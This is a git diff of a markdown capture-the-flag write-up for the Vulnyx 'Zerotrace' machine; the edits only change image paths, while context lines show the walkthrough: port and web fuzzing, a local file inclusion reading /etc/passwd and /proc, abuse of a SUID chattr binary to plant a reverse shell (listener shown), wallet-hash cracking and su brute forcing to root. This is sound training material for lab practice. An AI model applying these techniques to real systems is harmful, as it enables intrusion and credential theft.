@@ -5,7 +5,7 @@ title: WriteUp Zerotrace - Vulnyx
 slug: zerotrace-writeup-vulnyx-en
 featured: false
 draft: false
-ogImage: "assets/zerotrace/OpenGraph.png"
+ogImage: "../../assets/images/zerotrace/OpenGraph.png"
 tags:
     - Vulnyx
     - LFI
@@ -17,7 +17,7 @@ description:
 lang: en
 ---
 
-![VBox](/assets/zerotrace/vbox.png)
+![VBox](../../assets/images/zerotrace/vbox.png)
 
 This writeup describes the resolution of the **Zerotrace** machine created by [suraxddq](https://byte-mind.net/). It is the first writeup on my blog that does not belong to a machine created by me. I hope it helps you.
 
@@ -33,7 +33,7 @@ We quickly scan all ports with nmap.
 nmap -p- -Pn -n -sS 192.168.1.187
 ```
 
-![Nmap all ports](/assets/zerotrace/nmap1.png)
+![Nmap all ports](../../assets/images/zerotrace/nmap1.png)
 
 We observe three open ports: 22, 80, and 8000. We perform a more detailed scan to identify the services, versions, and possible attack vectors using nmap scripts.
 
@@ -41,7 +41,7 @@ We observe three open ports: 22, 80, and 8000. We perform a more detailed scan t
 nmap -p22,80,8000 -sVC -Pn -n 192.168.1.187 -o nmap.txt
 ```
 
-![Nmap](/assets/zerotrace/nmap2.png)
+![Nmap](../../assets/images/zerotrace/nmap2.png)
 
 We can observe that the operating system is `Debian`, port **22** corresponds to the `SSH` service with `OpenSSH`, port **80** hosts an `http` website with `nginx`, and port **8000** seems to be an `FTP` service implemented with `pyftpdlib`. The versions are current and do not present apparent vulnerabilities.
 
@@ -63,7 +63,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-med
 
 After several unsuccessful attempts, I tried different techniques such as `HTTP Request smuggling`, analyzed potential vulnerabilities in the service versions, and executed the `strings` command on the OVA file, which allowed me to discover relevant information like the system users. Faced with the lack of progress, I decided to ask suraxddq for a hint.
 
-![Discord](/assets/zerotrace/discord.png)
+![Discord](../../assets/images/zerotrace/discord.png)
 
 With the hint "*And if you don't see it... .*" it helped me to continue. We search for all hidden files and folders that start with a dot `.` using `ffuf`.
 
@@ -71,7 +71,7 @@ With the hint "*And if you don't see it... .*" it helped me to continue. We sear
 ffuf -u http://192.168.1.187/.FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "User-Agent: Mozilla/5.0" -fs 153 -t 40
 ```
 
-![FFUF](/assets/zerotrace/ffuf1.png)
+![FFUF](../../assets/images/zerotrace/ffuf1.png)
 
 We found the folder `/.admin`. We continue fuzzing inside this folder.
 
@@ -79,7 +79,7 @@ We found the folder `/.admin`. We continue fuzzing inside this folder.
 gobuster dir -u http://192.168.1.187/.admin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .pcap,.php,.txt,.zip,.db,.htm,.html,.phar,.db,.sql,.sql.gz,.sql.zip
 ```
 
-![gobuster](/assets/zerotrace/gobuster.png)
+![gobuster](../../assets/images/zerotrace/gobuster.png)
 
 We found the file `/.admin/tool.php`. Being a PHP file that does not display any content (0 characters), we proceeded to perform parameter fuzzing for both POST and GET to discover possible entry vectors.
 
@@ -89,7 +89,7 @@ POST parameter fuzzing.
 ffuf -u "http://192.168.1.187/.admin/tool.php" -X POST -d "FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 ```
 
-![ffuf-post](/assets/zerotrace/ffuf-post.png)
+![ffuf-post](../../assets/images/zerotrace/ffuf-post.png)
 
 Not finding results with POST parameter fuzzing, we proceeded to perform GET parameter fuzzing.
 
@@ -97,11 +97,11 @@ Not finding results with POST parameter fuzzing, we proceeded to perform GET par
 ffuf -u "http://192.168.1.187/.admin/tool.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 ```
 
-![ffuf-get](/assets/zerotrace/ffuf-get.png)
+![ffuf-get](../../assets/images/zerotrace/ffuf-get.png)
 
 We found the `file` parameter. By accessing the URL `/.admin/tool.php?file=/etc/passwd`, we can see the contents of the `/etc/passwd` file, which contains the list of system users.
 
-![ffuf-get](/assets/zerotrace/etcpasswd.png)
+![ffuf-get](../../assets/images/zerotrace/etcpasswd.png)
 
 We use a [wordlist for LFI](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/LFI-WordList-Linux) from DragonJAR and can only obtain the files `/etc/passwd` and `/etc/hosts`.
 
@@ -109,9 +109,9 @@ We use a [wordlist for LFI](https://raw.githubusercontent.com/DragonJAR/Security
 ffuf -u "http://192.168.1.187/.admin/tool.php?file=FUZZ" -w ./LFI-WordList-Linux -fs 0
 ```
 
-![ffuf-get](/assets/zerotrace/ffuf-lfi.png)
+![ffuf-get](../../assets/images/zerotrace/ffuf-lfi.png)
 
-![ffuf-get](/assets/zerotrace/etc-hosts.png)
+![ffuf-get](../../assets/images/zerotrace/etc-hosts.png)
 
 We tried to access the files in the `/proc` directory of Linux, where we can see the commands executed by the active services in `/proc/[PID]/cmdline`.
 
@@ -135,7 +135,7 @@ jq -r '.results[].url' cmd-ffuf.txt | xargs -P4 -I {} sh -c 'echo "\n***********
 
 Now we can observe all the commands found on the server in the file `resultados.txt`.
 
-![resultados.txt](/assets/zerotrace/resultadostxt.png)
+![resultados.txt](../../assets/images/zerotrace/resultadostxt.png)
 
 We found the command that starts the `FTP` service on port `8000`, where the password used for the user `J4ckie0x17` is exposed.
 
@@ -147,7 +147,7 @@ With the found password for `J4ckie0x17`, we can access the FTP service on port 
 ssh J4ckie0x17@192.168.1.187
 ```
 
-![ssh J4ckie0x17](/assets/zerotrace/ssh.png)
+![ssh J4ckie0x17](../../assets/images/zerotrace/ssh.png)
 
 ## Lateral movement from J4ckie0x17 to shelldredd
 
@@ -159,7 +159,7 @@ We found several interesting things with the user `J4ckie0x17`.
 find / -type f -perm -4000 2>/dev/null
 ```
 
-![find suid](/assets/zerotrace/suid.png)
+![find suid](../../assets/images/zerotrace/suid.png)
 
 2. We use `pspy` to monitor the active processes and found one executed by the user `shelldredd` with the `UID` 1003, which is very suspicious.
 
@@ -167,7 +167,7 @@ find / -type f -perm -4000 2>/dev/null
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s && chmod +x pspy64s && ./pspy64s
 ```
 
-![shelldredd process](/assets/zerotrace/shelldreddprocess.png)
+![shelldredd process](../../assets/images/zerotrace/shelldreddprocess.png)
 
 ```raw
 CMD: UID=1003  PID=1475  | /bin/sh -c /bin/bash /opt/.nobodyshouldreadthis/destiny
@@ -179,7 +179,7 @@ When examining the `destiny` binary, it seems we can modify it and it doesn't co
 lsattr /opt/.nobodyshouldreadthis/destiny
 ```
 
-![destiny inmutable](/assets/zerotrace/inmutable.png)
+![destiny inmutable](../../assets/images/zerotrace/inmutable.png)
 
 We use the `chattr` binary with SUID permissions to remove the immutable flag.
 
@@ -187,7 +187,7 @@ We use the `chattr` binary with SUID permissions to remove the immutable flag.
 chattr -i /opt/.nobodyshouldreadthis/destiny
 ```
 
-![destiny no inmutable](/assets/zerotrace/inmutable2.png)
+![destiny no inmutable](../../assets/images/zerotrace/inmutable2.png)
 
 Now we can modify the `destiny` file, adding a reverse shell that points to our attacking machine on port 443.
 
@@ -203,7 +203,7 @@ nc -lvnp 443
 
 After waiting approximately one minute, we receive a reverse shell with the privileges of the user `shelldredd`.
 
-![shell con shelldredd](/assets/zerotrace/shell-shelldredd.png)
+![shell con shelldredd](../../assets/images/zerotrace/shell-shelldredd.png)
 
 ## Lateral movement from shelldredd to ll104567
 
@@ -241,7 +241,7 @@ From our host, we copy the files from `ll104567`'s cryptovault to our machine us
 scp -r shelldredd@192.168.1.187:/opt/cryptovault/ll104567 .
 ```
 
-![scp vault](/assets/zerotrace/scp-vault.png)
+![scp vault](../../assets/images/zerotrace/scp-vault.png)
 
 Following the techniques described in the analysis of vulnerabilities in Ethereum wallet keystore files, we proceeded to attempt to crack the wallet.
 
@@ -253,11 +253,11 @@ First, we must obtain the wallet hash using `ethereum2john`, which we will later
 ethereum2john secret
 ```
 
-![ethereum2john](/assets/zerotrace/ethereum2john.png)
+![ethereum2john](../../assets/images/zerotrace/ethereum2john.png)
 
 We save the `hash` in a file.
 
-![ethereum2john](/assets/zerotrace/hash.png)
+![ethereum2john](../../assets/images/zerotrace/hash.png)
 
 We proceed to attempt to crack it with `hashcat`.
 
@@ -271,7 +271,7 @@ After a waiting period, hashcat discovers the password `dragonballz` located on 
 hashcat -m 15700 hash /usr/share/wordlists/rockyou.txt --show
 ```
 
-![wallet pass](/assets/zerotrace/walletpass.png)
+![wallet pass](../../assets/images/zerotrace/walletpass.png)
 
 ### Password of ll104567 and dictionary
 
@@ -285,7 +285,7 @@ In the home directory of shelldredd, we created a dictionary with the file `/hom
 sed 's/^/dragonballz/' ../ll104567/one > ~/diccionario.txt
 ```
 
-![Diccionario password](/assets/zerotrace/diccionario.png)
+![Diccionario password](../../assets/images/zerotrace/diccionario.png)
 
 We download the `suForce` tool from d4t4s3c, a very useful tool for brute force.
 
@@ -299,7 +299,7 @@ and we use it with the created dictionary to try to obtain the password of the u
 ./suForce -u ll104567 -w ./diccionario.txt
 ```
 
-![suForce](/assets/zerotrace/suforce.png)
+![suForce](../../assets/images/zerotrace/suforce.png)
 
 Bingo! We obtain the password for the user ll104567.
 
@@ -313,7 +313,7 @@ Using `su` from the user shelldredd or accessing via `SSH` with the obtained pas
 su ll104567
 ```
 
-![su](/assets/zerotrace/su.png)
+![su](../../assets/images/zerotrace/su.png)
 
 The user `ll104567` has permissions to execute as `root` using sudo the executable `/home/ll104567/guessme` which we previously analyzed and was vulnerable.
 
@@ -374,11 +374,11 @@ done
 
 We copy the code and create a file in the user's home directory, assign it execution permissions, and run it.
 
-![root pass](/assets/zerotrace/rootpass.png)
+![root pass](../../assets/images/zerotrace/rootpass.png)
 
 Once the `root` user's password is obtained through the script, we use the `su` command to switch to the root user. Finally, we read the contents of the `root.txt` file, which contains the system's final flag.
 
-![root flag](/assets/zerotrace/rootflag.png)
+![root flag](../../assets/images/zerotrace/rootflag.png)
 
 I thank suraxddq for this excellent virtual machine. Through this lab, I have gained valuable knowledge about the security of Ethereum wallets and the vulnerabilities associated with their implementation.
 
